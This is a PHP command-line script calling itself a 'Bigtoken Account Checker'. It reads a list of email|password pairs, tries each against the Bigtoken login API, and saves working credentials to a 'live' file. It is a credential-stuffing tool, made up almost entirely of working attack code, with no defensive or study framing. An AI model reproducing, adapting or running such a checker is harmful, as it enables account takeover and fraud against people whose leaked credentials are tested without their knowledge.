<?php  
error_reporting(0);
ini_set('display_errors', 1);
ini_set('max_execution_time', 300000000);
$live = 0;
$die = 0;
$rann = rand(1,9999999999);

$i = 0;
$listcode = $argv[1];
$codelistlist = file_get_contents($listcode);
$code_list_array = file($listcode);
$code = explode(PHP_EOL, $codelistlist);
$count = count($code);
echo "\033[39m ==========================\n";
echo "Created by Alip Dzikri \n";
echo "Bigtoken Account Checker \n";
echo "==========================\n";
echo " Total Empas : $count \r\n";
while($i < $count) {
  $percentage = round(($i+1)/$count*100,2);
  
  $akun = explode("|", $code[$i]); 
  $email = $akun[0];
  $pass = trim($akun[1]);
  
  $body = "email=".$email."&password=".$pass."";
  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://api.bigtoken.com/login");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
  $header = array("Accept: application/json");
  $headers = array();
        $headers[] = "Host:api.bigtoken.com";
       $headers[] = "content-type:application/x-www-form-urlencoded";
        $headers[] = "content-length:40";
        $headers[] = "accept-encoding:gzip";
  $headers[] = "";
  curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
  curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)');
  curl_setopt($ch, CURLOPT_POST, 1);
  
 $result = curl_exec($ch);
 if(preg_match('/"INVALID_FIELD_MANDATORY"/', $result)){
 	echo "\033[96m UNKNOWN ".$email." | ".$pass." | ./Dzi \033[0m \n";
 }
 if(preg_match('/INVALID_CREDENTIALS/', $result)){
 	echo "\033[91m DIE ".$email." | ".$pass." | ./Dzi \033[0m \n";
 } 
if(preg_match('/access_token/', $result)){
	echo "\033[93m LIVE ".$email." | ".$pass." | ACC : BIGTOKEN ./Dzi \033[0m\n";
 	 $livee = "bigtt-live.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "LIVE => $email | $pass | ACC : BIGTOKEN ./Dzi \n");
    fclose($fopen);
    $live++;
}
    
   curl_close($ch);
  $i++;
}
